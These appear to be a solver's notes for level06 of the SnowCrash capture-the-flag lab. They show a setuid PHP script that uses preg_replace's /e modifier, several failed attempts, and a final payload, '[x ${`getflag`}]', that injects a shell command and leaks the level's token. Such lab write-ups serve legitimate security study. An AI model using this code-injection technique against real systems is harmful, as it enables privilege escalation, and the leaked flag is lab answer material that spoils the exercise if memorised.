level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile


level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>


argv1 = fileName->getContent->"[x ?]"=y("fileName")
argv2 = 


https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
regex:

./ -> ' x '
@ -> ' y'

x /anything/
e = 


 ./level06 /bin/getflag
 ...
libcldCheck flag.Here is your token : You are root are you that dumb ?
 ...
Nope there is no token here for you sorry. Try again :)00000000 00:00 0LD_PRELOAD detected through memory maps exit ..
 ...


try1:
level06@SnowCrash:~$ echo "[/bin/getflag]" > /tmp/lvl06
level06@SnowCrash:~$ ./level06 /tmp/lvl06
(/bin/getflag)

try2:
level06@SnowCrash:~$ echo "[x /bin/getflag]" > /tmp/lvl06
level06@SnowCrash:~$ ./level06 /tmp/lvl06
/bin/getflag


level06@SnowCrash:~$ echo "[x getflag]" > /tmp/lvl06
level06@SnowCrash:~$ ./level06 /tmp/lvl06
getflag
level06@SnowCrash:~$ echo "[x `getflag`]" > /tmp/lvl06
level06@SnowCrash:~$ ./level06 /tmp/lvl06
(x Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :))



 echo '[x ${`getflag`}]' > /tmp/lvl06
level06@SnowCrash:~$ ./level06 /tmp/lvl06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
